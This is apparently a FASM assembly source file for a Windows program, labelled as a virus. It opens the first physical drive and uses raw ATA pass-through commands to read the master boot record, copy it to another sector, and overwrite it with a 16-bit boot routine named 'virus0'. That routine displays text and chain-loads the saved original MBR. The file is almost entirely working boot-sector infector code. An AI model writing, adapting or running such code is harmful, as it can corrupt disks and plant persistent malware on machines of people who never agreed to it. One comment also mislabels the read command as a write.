format PE GUI 4.0
;format MZ
entry main
;=======================================================================
include '\include\win32a.inc'
;=======================================================================
section ".Bruno's" code executable readable writeable
use32
main:
CALL IDENTIFYDEVICE
MOV [TotalOfSectors],0
CALL READSECTOR

MOV [TotalOfSectors],6
CALL WRITESECTOR

MOV EDI,PTE1
ADD EDI,28h
MOV ESI,virus0
MOV ECX,1BDH
REP MOVSB

MOV [TotalOfSectors],0
CALL WRITESECTOR

RET

proc IDENTIFYDEVICE
invoke CreateFileA,PHYSICALDRIVE,GENERIC_ALL,3,0,3,0,0
MOV [hDevice],EAX
MOV EAX,28h
MOV [PTE1.Length1],AX

MOV EAX,0Ah
MOV [PTE1.TimeOutValue],EAX

MOV EAX,200h
MOV [PTE1.DataTransferLength],EAX

MOV EAX,sizeof.ATA_PASS_THRU
MOV [PTE1.DATABUFFEROFFSET],EAX

MOV AL,0ECh
MOV [PTE1.Ata2.Command],AL

MOV AL,0
MOV [PTE1.Ata2.Count],AL
MOV BL,0
MOV AL,BL

OR AL,0E0h
MOV [PTE1.Ata2.Device_Head],AL

MOV AX,3h
MOV [PTE1.AtaFlags],AX

mov ebx,0
mov al,bl

MOV [PTE1.Ata2.Number],AL

mov ebx,0
mov al,bl

MOV [PTE1.Ata2.Cylinder],AL

mov ebx,0
MOV [PTE1.Ata2.CylinderH],AL

invoke DeviceIoControl,[hDevice],4D02Ch,PTE1,228h,PTE1,228h,NIL,0

invoke CloseHandle,[hDevice]
RET
endp

proc WRITESECTOR
invoke CreateFileA,PHYSICALDRIVE,GENERIC_ALL,3,0,3,0,0
MOV [hDevice],EAX

MOV EAX,28h
MOV [PTE1.Length1],AX

MOV EAX,0Ah
MOV [PTE1.TimeOutValue],EAX

MOV EAX,512
MOV [PTE1.DataTransferLength],EAX

MOV EAX,sizeof.ATA_PASS_THRU
MOV [PTE1.DATABUFFEROFFSET],EAX

MOV AL,1
MOV [PTE1.Ata2.Count],AL
MOV BL,0
MOV AL,BL

MOV EBX,[TotalOfSectors]
and ebx,0FFh
mov al,bl
MOV [PTE1.Ata2.Number],AL

MOV EBX,[TotalOfSectors]
and ebx,0ff00h
shr ebx,8
mov al,bl
MOV [PTE1.Ata2.Cylinder],AL


MOV EBX,[TotalOfSectors]
and ebx,0ff0000h
shr ebx,16
mov al,bl
MOV [PTE1.Ata2.CylinderH],AL

MOV EBX,[TotalOfSectors]
and ebx,0ff000000h
shr ebx,24
MOV AL,BL
OR AL,0E0h
MOV [PTE1.Ata2.Device_Head],AL

MOV AL,030h
MOV [PTE1.Ata2.Command],AL			;IMPORTANTE: COMANDO ATA 30H: ESCREVE SETOR(ES)

MOV AX,4
MOV [PTE1.AtaFlags],AX

	
invoke DeviceIoControl,[hDevice],4D02Ch,PTE1,228h,PTE1,228h,NIL,0
invoke CloseHandle,[hDevice]
ret
endp

proc READSECTOR
invoke CreateFileA,PHYSICALDRIVE,GENERIC_ALL,3,0,3,0,0
MOV [hDevice],EAX

MOV EAX,28h
MOV [PTE1.Length1],AX

MOV EAX,0Ah
MOV [PTE1.TimeOutValue],EAX

MOV EAX,512
MOV [PTE1.DataTransferLength],EAX

MOV EAX,sizeof.ATA_PASS_THRU
MOV [PTE1.DATABUFFEROFFSET],EAX

MOV AL,1
MOV [PTE1.Ata2.Count],AL
MOV BL,0
MOV AL,BL

MOV EBX,[TotalOfSectors]
and ebx,0FFh
mov al,bl
MOV [PTE1.Ata2.Number],AL

MOV EBX,[TotalOfSectors]
and ebx,0ff00h
shr ebx,8
mov al,bl
MOV [PTE1.Ata2.Cylinder],AL


MOV EBX,[TotalOfSectors]
and ebx,0ff0000h
shr ebx,16
mov al,bl
MOV [PTE1.Ata2.CylinderH],AL

MOV EBX,[TotalOfSectors]
and ebx,0ff000000h
shr ebx,24
MOV AL,BL
OR AL,0E0h
MOV [PTE1.Ata2.Device_Head],AL

MOV AL,020h
MOV [PTE1.Ata2.Command],AL			;IMPORTANTE: COMANDO ATA 30H: ESCREVE SETOR(ES)

MOV AX,3
MOV [PTE1.AtaFlags],AX

	
invoke DeviceIoControl,[hDevice],4D02Ch,PTE1,228h,PTE1,228h,NIL,0
invoke CloseHandle,[hDevice]
ret
endp

;BUF db 512 dup (0)
;section "Bruno'sL" code executable readable writeable
use16
proc virus0

;code:
xor ax,ax
mov ss,ax
mov ds,ax
mov es,ax
mov sp,7C00h
mov di,600h
mov si,7c00h
mov cx,512
cld
rep movsb
push ax
push 61Ch
retf

;virus:
mov ax,1300h
mov bx,30h
mov cx,509
mov dx,0
push cs
pop es
mov bp,632h    ;Address of String
INT 10h
IN AL,60H
CMP AL,1
JNZ 61FH
MOV AX,201H
XOR BX,BX
MOV ES,BX
MOV BX,7C00H
MOV CX,7
MOV DX,80H
INT 13H
JMP 0:7C00H
Label1:
Texto1 db '...',0
endp

;segment virii use16
;section '.data' data readable writeable
hDevice 	dd	0
hFile		dd	0
NIL		dd	0
Readed	    dd ?
High1	    dd 0
TotalOfSectors	dd 0
CurrentSector  dd 0
CurrentOffset  dd 0
PHYSICALDRIVE	       db  '\\.\PhysicalDrive0', 0
struct ATA_STRUCT1
	Features	db ?
	Count		db ?
	Number		db ?
	Cylinder	db ?
	CylinderH	db ?
	Device_Head	db ?
	Command 	db ?
	Reserved	db ?
ends
struct ATA_STRUCT2
	Features	db ?
	Count		db ?
	Number		db ?
	Cylinder	db ?
	CylinderH	db ?
	Device_Head	db ?
	Command 	db ?
	Reserved	db ?
ends
struct ATA_PASS_THRU
	Length1 			dw ?
	AtaFlags			dw ?
	PathId				db  ?
	TargetId			db  ?
	Lun				db  ?
	Reserved1			db  ?
	DataTransferLength		dd ?
	TimeOutValue			dd ?
	Reserved2			dd ?
	DATABUFFEROFFSET		dd ?
	Ata1				ATA_STRUCT1
	Ata2				ATA_STRUCT2
ends
	PTE1 ATA_PASS_THRU
struct IDENTIFY_DEVICE_DATA 
	GeneralConfiguration		dw ? 
	NumCylinders			dw ? 
	ReservedWord2			dw ? 
	NumHeads			dw ? 
	Retired1			dw 2 dup (?) 
	NumSectorsPerTrack		dw ? 
	VendorUnique1			dw 3 dup (?) 
	SerialNumber			db 20 dup (?) 
	Retired2			dw 2 dup (?) 
	Obsolete1			dw ? 
	FirmwareRevision		db 8 dup (?) 
	ModelNumber			db 40 dup (?) 
	MaximumBlockTransfer		db ? 
	VendorUnique2			db ? 
	ReservedWord48			dw ? 
	Capabilities			dd ? 
	ObsoleteWords51 		dw 2 dup (?) 
	TranslationFieldsValid		dw ? 
	NumberOfCurrentCylinders	dw ? 
	NumberOfCurrentHeads		dw ? 
	CurrentSectorsPerTrack		dw ? 
	CurrentSectorCapacity		dd ? 
	CurrentMultiSectorSetting	db ? 
	MultiSectorSettingValid 	db ? 
	UserAddressableSectors		dd ? 
	ObsoleteWord62			dw ? 
	MultiWordDMASupport		db ? 
	MultiWordDMAActive		db ? 
	AdvancedPIOModes		db ? 
	ReservedByte64			db ? 
	MinimumMWXferCycleTime		dw ? 
	RecommendedMWXferCycleTime	dw ? 
	MinimumPIOCycleTime		dw ? 
	MinimumPIOCycleTimeIORDY	dw ? 
	ReservedWords69 		dw 6 dup (?) 
	QueueDepth			dw ? 
	ReservedWords76 		dw 4 dup (?) 
	MajorRevision			dw ? 
	MinorRevision			dw ?	 
	CommandSetSupport		dw 3 dup (?) 
	CommandSetActive		dw 3 dup (?) 
	UltraDMASupport 		db ? 
	UltraDMAActive			db ? 
	ReservedWord89			dw 4 dup (?) 
	HardwareResetResult		dw ? 
	CurrentAcousticValue		db ? 
	RecommendedAcousticValue	db ? 
	ReservedWord95			dw 5 dup (?) 
	Max48BitLBA			dd 2 dup (?) 
	StreamingTransferTime		dw ? 
	ReservedWord105 		dw ? 
	PhysicalLogicalSectorSize	dw ? 
	InterSeekDelay			dw ? 
	WorldWideName			dw 4 dup (?) 
	ReservedForWorldWideName128	dw 4 dup (?) 
	ReservedForTlcTechnicalReport	dw ? 
	WordsPerLogicalSector		dw 2 dup (?) 
	CommandSetSupportExt		dw ? 
	CommandSetActiveExt		dw ? 
	ReservedForExpandedSupportandActive	dw 6 dup (?) 
	MsnSupport			dw ? 
	SecurityStatus			dw ? 
	ReservedWord129 		dw 31 dup (?) 
	CfaPowerModel			dw ? 
	ReservedForCfaWord161		dw 8 dup (?) 
	DataSetManagementFeature	dw ? 
	ReservedForCfaWord170		dw 6 dup (?) 
	CurrentMediaSerialNumber	dw 30 dup (?) 
	ReservedWord206 		dw ? 
	ReservedWord207 		dw 2 dup (?) 
	BlockAlignment			dw ? 
	WriteReadVerifySectorCountMode3Only	dw 2 dup (?) 
	WriteReadVerifySectorCountMode2Only	dw 2 dup (?) 
	NVCacheCapabilities		dw ? 
	NVCacheSizeLSW			dw ? 
	NVCacheSizeMSW			dw ? 
	NominalMediaRotationRate	dw ? 
	ReservedWord218 		dw ? 
	NVCacheEstimatedTimeToSpinUpInSeconds	dw ? 
	Reserved			dw ? 
	ReservedWord220 		dw 35 dup (?) 
	Signature			db ? 
	CheckSum			db ? 
 ends 
 idd IDENTIFY_DEVICE_DATA

section '.idata' import data readable writeable

  library kernel32,'KERNEL32.DLL',\
	  user32,  'USER32.DLL',\
	  comdlg32,'COMDLG32.DLL',\
	  shlwapi, 'SHLWAPI.DLL',\
	  ole32,   'OLE32.DLL',\
	  msvcrt,   'MSVCRT.DLL',\
	  shell32, 'SHELL32.DLL'
import msvcrt, itoa,'_itoa',\
strcpy,'strcpy',\
memcpy_s,'memcpy_s',\
strcat,'strcat',\
fopen,'fopen',\
fwrite,'fwrite',\
fclose,'fclose',\
sprintf,'sprintf'
include     '\include\api\kernel32.inc'
include     '\include\api\user32.inc'
include     '\include\api\comdlg32.inc'
include     '\include\api\shell32.inc'